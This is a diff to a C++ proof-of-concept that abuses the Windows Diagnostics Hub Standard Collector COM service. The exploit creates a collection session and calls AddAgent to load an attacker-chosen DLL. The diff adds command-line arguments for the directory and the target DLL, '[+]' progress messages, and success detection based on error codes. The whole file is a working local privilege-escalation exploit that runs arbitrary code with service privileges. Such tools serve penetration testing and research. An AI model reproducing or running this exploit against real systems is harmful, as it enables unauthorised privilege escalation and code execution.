@@ -1,9 +1,13 @@
 #include "pch.h"
 #include <iostream>
 #include <string>
+#include <cstring>
 #include <sddl.h>
 #include <strsafe.h>
 #include <comdef.h>
+#include <malloc.h>
+
+#define _CRT_SECURE_NO_WARNINGS
 
 
 class CoInit
@@ -67,21 +71,28 @@ void ThrowOnError(HRESULT hr)
 	}
 }
 
-int main()
+int wmain(int argc, wchar_t** argv)
 {
+	if (argc < 3) {
+		printf("Usage: ./diaghub.exe <valid path> <target dll (without path)>\n");
+		printf("  Example: diaghub.exe C:\\ProgramData xct.dll\n");
+		exit(0);
+	}
+
+	wchar_t* valid_dir = argv[1];
+	wchar_t* target_dll = argv[2];
+
 	CoInit coinit;
 	try
 	{
 		GUID name;
 		CoCreateGuid(&name);
 		LPOLESTR name_str;
-		StringFromIID(name, &name_str);
-
-		WCHAR valid_dir[] = L"C:\\programdata\\";
-		WCHAR target_dll[] = L"license.rtf";
+		StringFromIID(name, &name_str);		
 
 		IStandardCollectorServicePtr service;
 		ThrowOnError(CoCreateInstance(CLSID_CollectorService, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&service)));
+		printf("[+] CoCreateInstance\n");
 		DWORD authn_svc;
 		DWORD authz_svc;
 		LPOLESTR principal_name;
@@ -91,7 +102,9 @@ int main()
 		DWORD capabilities;
 
 		ThrowOnError(CoQueryProxyBlanket(service, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities));
+		printf("[+] CoQueryProxyBlanket\n");
 		ThrowOnError(CoSetProxyBlanket(service, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities));
+		printf("[+] CoSetProxyBlanket\n");
 		SessionConfiguration config = {};
 		config.version = 1;
 		config.monitor_pid = ::GetCurrentProcessId();
@@ -101,13 +114,24 @@ int main()
 		ICollectionSessionPtr session;
 
 		ThrowOnError(service->CreateSession(&config, nullptr, &session));
+		printf("[+] CreateSession\n");
 		GUID agent_guid;
 		CoCreateGuid(&agent_guid);
+		printf("[+] CoCreateGuid\n");
 		ThrowOnError(session->AddAgent(target_dll, agent_guid));
+		printf("[+] AddAgent\n");
 	}
 	catch (const _com_error& error)
 	{
-		printf("%ls\n", error.ErrorMessage());
-		printf("%08X\n", error.Error());
+		if (error.Error() == 0x8007045A || error.Error() == 0xC1110015)
+		{
+			printf("[+] Success\n");
+		}
+		else {
+			printf("[-] Error\n");
+			printf("%ls\n", error.ErrorMessage());
+			printf("%08X\n", error.Error());
+		}
+		
 	}
 }
